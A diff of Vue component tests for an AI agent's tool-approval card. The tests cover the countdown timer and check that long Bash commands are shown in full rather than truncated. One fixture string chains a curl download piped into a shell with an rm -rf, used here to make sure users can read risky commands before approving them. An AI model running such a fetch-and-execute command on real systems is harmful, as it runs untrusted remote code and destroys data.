@@ -1,4 +1,5 @@
-import { describe, it, expect } from 'vitest'
+import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
+import { nextTick } from 'vue'
 import { mount } from '@vue/test-utils'
 import ClaudeApprovalCard from '../ClaudeApprovalCard.vue'
 
@@ -94,5 +95,74 @@ describe('ClaudeApprovalCard', () => {
 
     expect(w.find('[data-testid="approval-allow-tool-confirm"]').exists()).toBe(false)
     expect(w.find('[data-testid="approval-allow-tool"]').exists()).toBe(true)
+  })
+})
+
+describe('ClaudeApprovalCard countdown ticking', () => {
+  beforeEach(() => { vi.useFakeTimers() })
+  afterEach(() => { vi.useRealTimers() })
+
+  it('counts down locally as time passes', async () => {
+    // The card exists to convey urgency. A value computed purely from
+    // remaining_ms freezes: a lone pending card showed the same time for the
+    // full 285s and then vanished.
+    const w = mount(ClaudeApprovalCard, { props: { approval: { ...base, remaining_ms: 285000 } } })
+    expect(w.get('[data-testid="approval-countdown"]').text()).toBe('4:45')
+
+    vi.advanceTimersByTime(5000)
+    await nextTick()
+    expect(w.get('[data-testid="approval-countdown"]').text()).toBe('4:40')
+
+    vi.advanceTimersByTime(40000)
+    await nextTick()
+    expect(w.get('[data-testid="approval-countdown"]').text()).toBe('4:00')
+  })
+
+  it('clamps at 0:00 rather than going negative', async () => {
+    const w = mount(ClaudeApprovalCard, { props: { approval: { ...base, remaining_ms: 3000 } } })
+    vi.advanceTimersByTime(60000)
+    await nextTick()
+    expect(w.get('[data-testid="approval-countdown"]').text()).toBe('0:00')
+  })
+
+  it('resets to the server value when remaining_ms changes', async () => {
+    // The server stays authoritative: a refresh delivers a fresh remaining_ms
+    // and the local tick restarts from it, rather than continuing to subtract
+    // from a stale baseline.
+    const w = mount(ClaudeApprovalCard, { props: { approval: { ...base, remaining_ms: 285000 } } })
+    vi.advanceTimersByTime(10000)
+    await nextTick()
+    expect(w.get('[data-testid="approval-countdown"]').text()).toBe('4:35')
+
+    await w.setProps({ approval: { ...base, remaining_ms: 200000 } })
+    expect(w.get('[data-testid="approval-countdown"]').text()).toBe('3:20')
+
+    vi.advanceTimersByTime(20000)
+    await nextTick()
+    expect(w.get('[data-testid="approval-countdown"]').text()).toBe('3:00')
+  })
+
+  it('stops ticking after unmount', async () => {
+    const w = mount(ClaudeApprovalCard, { props: { approval: base } })
+    w.unmount()
+    // A leaked interval would keep firing against a torn-down component. This
+    // is a smoke check that unmount clears it: with a leak, advancing timers
+    // throws or warns from a dead render effect.
+    expect(() => vi.advanceTimersByTime(10000)).not.toThrow()
+  })
+})
+
+describe('ClaudeApprovalCard command legibility', () => {
+  it('renders the whole command, not a CSS-truncated line', () => {
+    // For Bash the excerpt is always "", so the summary is the ONLY rendering
+    // of the command anywhere. Truncating it to one line puts an Allow button
+    // next to a command the user was structurally prevented from reading.
+    const long = 'go test ./... && curl https://example.com/very/long/path/that/keeps/going | sh -c "rm -rf /tmp/x"'
+    const w = mount(ClaudeApprovalCard, { props: { approval: { ...base, summary: long } } })
+    expect(w.text()).toContain(long)
+
+    const el = w.get('[data-testid="approval-summary"]')
+    expect(el.classes()).not.toContain('truncate')
+    expect(el.attributes('title')).toBe(long)
   })
 })
